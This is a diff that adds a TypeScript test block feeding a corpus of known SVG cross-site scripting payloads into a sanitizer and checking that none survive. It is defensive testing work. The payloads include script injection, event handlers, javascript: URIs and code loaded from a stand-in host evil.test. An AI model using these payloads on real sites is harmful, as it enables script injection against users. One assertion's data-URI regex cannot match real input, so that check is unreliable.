@@ -237,3 +237,85 @@ describe('@import, namespaced elements and animation targets (item 5)', () => {
     expect(sanitizeSvgString(input)).toBe(input);
   });
 });
+
+describe('known SVG XSS payload corpus', () => {
+  const corpus: Array<[string, string]> = [
+    ['plain script', '<svg><script>alert(1)</script></svg>'],
+    ['mixed-case script', '<svg><ScRiPt>alert(1)</sCrIpT ></svg>'],
+    ['script with src and slash separator', '<svg><script/src=//evil.test/x.js></script></svg>'],
+    ['self-closing script', '<svg><script src="data:,alert(1)"/></svg>'],
+    ['split opener', '<svg><scr<script>ipt>alert(1)</script></svg>'],
+    ['doubly split opener', '<svg><sc<script>r<script>ipt>ipt>alert(1)</script>ript></svg>'],
+    ['split opener through @import', '<svg><style><scr@import x;ipt>alert(1)</scr@import y;ipt></style></svg>'],
+    ['split opener through url()', '<svg><style><scr url(http://e/x)ipt>alert(1)</scr url(http://e/y)ipt></style></svg>'],
+    ['script inside comment-looking text', '<svg><!----><script>alert(1)</script><!----></svg>'],
+    ['script after unterminated comment opener', '<svg><!-><script>alert(1)</script>--></svg>'],
+    ['script inside CDATA', '<svg><![CDATA[<script>alert(1)</script>]]></svg>'],
+    ['script split by CDATA', '<svg><scr<![CDATA[x]]>ipt>alert(1)</script></svg>'],
+    ['namespaced script', '<svg xmlns:x="http://www.w3.org/2000/svg"><x:script>alert(1)</x:script></svg>'],
+    ['foreignObject with html script', '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>'],
+    ['namespaced foreignObject', '<svg><x:foreignObject><iframe srcdoc="x"/></x:foreignObject></svg>'],
+    ['iframe', '<svg><iframe src="javascript:alert(1)"></iframe></svg>'],
+    ['object and embed', '<svg><object data="javascript:alert(1)"/><embed src="javascript:alert(1)"/></svg>'],
+    ['onload on root', '<svg onload="alert(1)"></svg>'],
+    ['onload without whitespace', '<svg/onload=alert(1)>'],
+    ['onload after quoted attribute', '<svg a="b"onload=alert(1)>'],
+    ['upper-case handler', '<svg ONLOAD="alert(1)"><rect OnClick=alert(1) /></svg>'],
+    ['handler on image', '<svg><image href="x" onerror="alert(1)"/></svg>'],
+    ['handler with newline around equals', '<svg><rect onclick\n=\n"alert(1)"/></svg>'],
+    ['handler on animate', '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>'],
+    ['handler on discard', '<svg><discard onbegin=alert(1)/></svg>'],
+    ['javascript href', '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>'],
+    ['javascript xlink:href', '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'],
+    ['mixed-case javascript href', '<svg><a href="jAvAsCrIpT:alert(1)"/></svg>'],
+    ['entity-encoded javascript href', '<svg><a href="&#106;avascript:alert(1)"/></svg>'],
+    ['hex entity-encoded javascript href', '<svg><a xlink:href="jav&#x61;script&#x3a;alert(1)"/></svg>'],
+    ['tab-split javascript href', '<svg><a href="java&#x09;script:alert(1)"/></svg>'],
+    ['unquoted javascript href', '<svg><a href=javascript:alert(1)><text>x</text></a></svg>'],
+    ['vbscript href', '<svg><a href="vbscript:msgbox(1)"/></svg>'],
+    ['data html href', '<svg><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="/></svg>'],
+    ['data svg use', '<svg><use href="data:image/svg+xml;base64,PHN2Zy8+"/></svg>'],
+    ['set retargeting href', '<svg><a><set attributeName="href" to="javascript:alert(1)"/><text>x</text></a></svg>'],
+    ['animate values href', '<svg><a><animate attributeName="xlink:href" values="#a;javascript:alert(1)"/></a></svg>'],
+    ['set onmouseover', '<svg><rect width="9" height="9"><set attributeName="onmouseover" to="alert(1)"/></rect></svg>'],
+    ['animate onclick', '<svg><rect><animate attributeName="onclick" values="alert(1)" dur="1s"/></rect></svg>'],
+    ['style single-quote breakout', `<svg><rect style='x"/onload="alert(1)'/></svg>`],
+    ['style unquoted breakout', '<svg><rect style=x"/onload="alert(1)/></svg>'],
+    ['style @import', '<svg><style>@import url(http://evil.test/x.css);</style></svg>'],
+    ['style @import without space', '<svg><style>@import"http://evil.test/x.css";</style></svg>'],
+    ['style external url', '<svg><style>rect{fill:url(http://evil.test/x)}</style></svg>'],
+    ['style unterminated', '<svg><style><script>alert(1)</script>'],
+    ['nested style openers', '<svg><style><style><script>alert(1)</script></style></style></svg>'],
+    ['doctype entity', '<!DOCTYPE svg [<!ENTITY x "<script>alert(1)</script>">]><svg>&x;</svg>'],
+    ['meta refresh', '<svg><meta http-equiv="refresh" content="0;url=javascript:alert(1)"/></svg>'],
+  ];
+
+  const HTML_ENTITY = /&#x([0-9a-f]+);|&#(\d+);/gi;
+  function decodedValue(value: string): string {
+    return value
+      .replace(HTML_ENTITY, (_, hex: string | undefined, dec: string | undefined) =>
+        String.fromCharCode(hex === undefined ? Number(dec) : parseInt(hex, 16))
+      )
+      .replace(/[\s\x00-\x1f]/g, '')
+      .toLowerCase();
+  }
+
+  for (const [label, payload] of corpus) {
+    it(`leaves no executable construct: ${label}`, () => {
+      const out = sanitizeSvgString(payload);
+      const lowered = out.toLowerCase();
+      expect(lowered).not.toContain('<script');
+      expect(lowered).not.toContain('<iframe');
+      expect(lowered).not.toContain('<foreignobject');
+      expect(lowered).not.toMatch(/<\w+:(?:script|foreignobject|iframe|object|embed)/);
+      expect(executableConstructs(out)).toEqual([]);
+      for (const tag of parseTags(out)) {
+        for (const attr of tag.attrs) {
+          expect(decodedValue(attr.value)).not.toMatch(/^(?:javascript|vbscript|data:text\/html|data:image\/svg\+xml):/);
+          if (/^(?:xlink:)?href$/i.test(attr.name)) expect(decodedValue(attr.value)).not.toMatch(/^(?:https?:|file:|ftp:|\/\/)/);
+        }
+      }
+      expect(sanitizeSvgString(out)).toBe(out);
+    });
+  }
+});
